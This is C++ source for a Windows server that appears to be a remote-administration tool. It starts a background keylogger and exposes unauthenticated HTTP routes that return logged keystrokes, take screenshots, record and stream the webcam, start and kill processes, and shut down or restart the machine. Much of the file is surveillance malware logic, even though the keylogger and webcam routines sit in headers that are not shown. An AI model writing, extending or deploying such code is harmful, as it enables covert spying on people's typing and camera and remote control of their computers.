#include <opencv2/opencv.hpp>
#include <mutex>
#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <thread>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include "config.h"
#include "http_utils.h"
#include "router.h"
#include "apps.h"
#include "processes.h"
#include "keylogger.h"
#include "webcam.h"
#include "system.h"

int main() {
    
    std::thread loggerThread(StartKeyloggerThread);
    loggerThread.detach();


    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET server_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    bind(server_fd, (sockaddr*)&address, sizeof(address));
    listen(server_fd, 5);

    std::cout << "Server running on port " << PORT << "...\n";
    std::cout << "Keylogger is active in background...\n";

    while (true) {
        SOCKET client_socket = accept(server_fd, NULL, NULL);
        if (client_socket == INVALID_SOCKET) continue;

        char buffer[BUFFER_SIZE] = {0};
        recv(client_socket, buffer, BUFFER_SIZE, 0);
        
        std::string request(buffer);
        std::stringstream ss(request);
        std::string method, full_path;
        ss >> method >> full_path;

        if (method.empty()) {
            closesocket(client_socket);
            continue;
        }

        std::string route = get_route_path(full_path);
        std::map<std::string, std::string> query = parse_query(full_path);
        std::string response;

        std::cout << "Request: " << route << std::endl;

        // --- ROUTER ---
        if (route == "/ping") {
            response = http_response("pong");
        }
        else if (route.find(".bmp") != std::string::npos || route.find(".avi") != std::string::npos) {
            std::string filename = route.substr(1); 
            serve_file(client_socket, filename);
            closesocket(client_socket);
            continue; // Xử lý xong thì tiếp tục vòng lặp mới
        }

        else if (route == "/apps") {
            response = list_apps();
        }
        else if (route == "/apps/start") {
            std::string name = query["name"];
            if (name.length() >= 4 && name.substr(name.length() - 4) == ".exe") start_app_sys(name);
            else start_app_sys(name);
            response = http_response("Started " + name);
        }
        else if (route == "/apps/stop") {
            std::string name = query["name"];
            if (name.length() >= 4 && name.substr(name.length() - 4) == ".exe") stop_process_sys(name);
            else stop_process_sys(name + ".exe");
            response = http_response("Stopped " + name);
        }
        else if (route == "/processes") {
            response = list_processes();
        }
        else if (route == "/processes/stop") {
            std::string target = query["name"]; // Dùng param 'name' cho thống nhất
            stop_process_sys(target); 
            response = http_response("Kill command sent to " + target);
        }
        else if (route == "/keylogger/send") {
            response = keylog_append(query["key"]);
        }
        else if (route == "/keylogger/get") {
            response = http_response(KEY_LOG_BUFFER);
        }
        else if (route == "/shutdown") {
            response = system_control("shutdown");
        }
        else if (route == "/restart") {
            response = system_control("restart");
        }
        else if (route == "/screenshot") {
            std::string filename = take_screenshot(); 
            response = http_response("/" + filename); 
        }
        else if (route == "/webcam/start") {
            start_webcam();
            response = http_response("Webcam started");
        }
        else if (route == "/webcam/stop") {
            stop_webcam();
            response = http_response("Webcam stopped");
        }
        else if (route.find("/snapshot_stream") != std::string::npos) {
            std::vector<uchar> jpeg_buf;
            if (get_latest_frame(jpeg_buf)) {
                std::string header = "HTTP/1.1 200 OK\r\n";
                header += "Content-Type: image/jpeg\r\n";
                header += "Content-Length: " + std::to_string(jpeg_buf.size()) + "\r\n";
                header += "Connection: close\r\n\r\n";
                
                send(client_socket, header.c_str(), header.size(), 0);
                send(client_socket, reinterpret_cast<char*>(jpeg_buf.data()), jpeg_buf.size(), 0);
            }
        }
        else if (route == "/webcam") {
            int duration = 10;
            if (query.count("seconds")) {
                try { duration = std::stoi(query["seconds"]); } catch(...) {}
            }
            std::string filename = "webcam_" + std::to_string(duration) + "s.avi";
            std::thread t(record_webcam_thread_func, filename, duration * 1000);
            t.detach();

            response = http_response("/" + filename); // trả về đường dẫn file
        }
        else if (route.find(".avi") != std::string::npos) {
            std::string filename = route.substr(1);
            std::ifstream file(filename, std::ios::binary | std::ios::ate);
            if (file.is_open()) {
                std::streamsize size = file.tellg();
                file.seekg(0, std::ios::beg);
                std::vector<char> buffer(size);
                if (file.read(buffer.data(), size)) {
                    std::string header = "HTTP/1.1 200 OK\r\n";
                    header += "Content-Type: video/x-msvideo\r\n";
                    header += "Content-Disposition: attachment; filename=\"" + filename + "\"\r\n";
                    header += "Content-Length: " + std::to_string(size) + "\r\n";
                    header += "Connection: close\r\n\r\n";


                    send(client_socket, header.c_str(), header.size(), 0);
                    send(client_socket, buffer.data(), buffer.size(), 0);
                }
                file.close();
            }
        }
        else {
            response = http_response("Not Found", "404 Not Found");
        }

        send(client_socket, response.c_str(), response.length(), 0);
        closesocket(client_socket);
    }

    closesocket(server_fd);
    WSACleanup();
    return 0;
}